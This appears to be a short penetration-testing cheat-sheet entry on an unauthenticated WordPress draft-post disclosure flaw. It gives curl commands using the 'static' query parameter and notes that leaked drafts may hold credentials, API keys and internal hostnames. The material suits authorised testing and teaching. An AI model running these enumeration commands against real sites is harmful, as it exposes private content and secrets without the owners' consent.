# WordPress Draft Post Disclosure

WordPress ≤5.8.2 exposes draft post content via the `static` query parameter with an incremented `page` value, without requiring authentication.

```bash
# Enumerate draft posts
curl -s 'http://<TARGET>/?static=1'
curl -s 'http://<TARGET>/?static=1&page=2'
# Look for hidden URLs, credentials, or internal subdomains in draft content

# Also check: /?p=<ID>&preview=true (may expose drafts if plugin misconfigured)
```

Common findings: registration URLs for internal services, credentials, API keys, internal hostnames.
